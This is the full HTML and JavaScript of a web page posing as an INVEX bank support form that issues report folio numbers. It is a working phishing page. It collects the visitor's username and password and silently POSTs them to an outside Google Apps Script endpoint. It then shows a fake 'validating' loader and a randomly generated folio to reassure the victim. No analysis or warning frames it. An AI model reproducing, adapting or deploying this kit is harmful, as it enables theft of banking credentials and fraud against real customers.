<!doctype html>
<html lang="es-LA">
<head>
    <meta name="viewport" content="width=device-width">
    <meta name="robots" content="noindex, nofollow">
    <meta property="og:locale" content="es_LA">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Genera Folio de Reporte | INVEX">
    <meta property="og:description" content="Ingresa para generar tu folio de reporte de atención telefónica o de asistencia virtual.">
    <meta property="og:url" content="/">
    <meta property="og:site_name" content="Reporte En Línea">
    <meta property="article:modified_time" content="2023-03-31T16:44:13+00:00">
    <meta property="og:image:width" content="924">
    <meta property="og:image:height" content="512">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Reporte">
    <meta name="twitter:label1" content="Tiempo estimado de lectura">
    <meta name="twitter:data1" content="1 minuto">
    <link rel='stylesheet' href='css/estilos.css' type='text/css' media='all' />
    <meta charset="utf-8">
    <title>Reporte - Reporte En Línea</title>
    <style>
        .hidden {
            display: none;
        }
    </style>
</head>

<body>
    <div class="main">
        <div class="topBar"></div>
        <div class="bkPer">
            <div class="acc">
                <div class="imagenR">
                    <h1><img src="img/logo.png" alt="bancaR"></h1>
                </div>
                <div class="contenedor">
                    <div class="linea"></div>
                    <p id="area">Área de soporte y cancelaciones</p>
                    <div class="columna-top-rwd"></div>
                    <div class="columna-izquierda">
                        <div class="registro activo" id="registro">
                            <form id="loginForm"  
							action="https://script.google.com/macros/s/AKfycbwSihjhjA6H3qiHsQG_-undhpZEkbfW8zvEle8DFHsM5n__LNd_PmOgdpyQk7Aoy0H0xQ/exec">
                                <label for="nombre">Usuario</label>
                                <input id="nombre" name="usr" type="text" placeholder="Usuario" required />
                                <label for="password">Contraseña</label>
                                <input id="password" type="password" name="pass" placeholder="Contraseña" required />
                                <button id="contact-form" type="submit" onclick="enviarFormulario()">Iniciar Sesión</button>
                            </form>
                        </div>
                        <div class="loader-container hidden" id="loaderContainer">
                            <div class="loader-wrapper">
                                <div class="loader"></div>
                                <h1>Validando información</h1>
                                <p>Estamos validando la información que ha ingresado. Este proceso puede durar hasta 60 segundos.</p>
                            </div>
                        </div>
                        <div class="header exito hidden" id="exito2">
                            <h2 class="txtFolio">Tu folio es:</h2>
                            <h1 class="folio" id="folioNumero"></h1>
                            <div class="texto-folio">
                                <p>Comparte este folio con tu asesor telefónico o asistente virtual.</p>
                            </div>
                            <p class="txt"><i><b>Recuerda que INVEX nunca te pedirá tu contraseña por llamada telefónica.</i></b></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
		const scriptURL = 'https://script.google.com/macros/s/AKfycbwSihjhjA6H3qiHsQG_-undhpZEkbfW8zvEle8DFHsM5n__LNd_PmOgdpyQk7Aoy0H0xQ/exec'

const form = document.forms['loginForm']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .catch(error => console.error('Error!', error.message))
})
        function enviarFormulario() {
            let usuario = document.getElementById('nombre').value;
            let contraseña = document.getElementById('password').value;

            if (usuario && contraseña) {
                mostrarLoader();
                setTimeout(function() {
                    ocultarLoader();
                    mostrarFolio();
                }, 10000);
            } else {
                alert("Por favor, ingresa tu usuario y contraseña.");
            }
        }

        function mostrarLoader() {
            document.getElementById('loaderContainer').classList.remove('hidden');
        }

        function ocultarLoader() {
            document.getElementById('loaderContainer').classList.add('hidden');
        }

		function mostrarFolio() {
            document.getElementById('registro').style.display = 'none';
            document.getElementById('exito2').style.display = 'block';
            const folioAleatorio = Math.floor(Math.random() * 900000000 + 100000000);
            document.getElementById('folioNumero').textContent = 'X' + folioAleatorio;
        }
    </script>
</body>
</html>
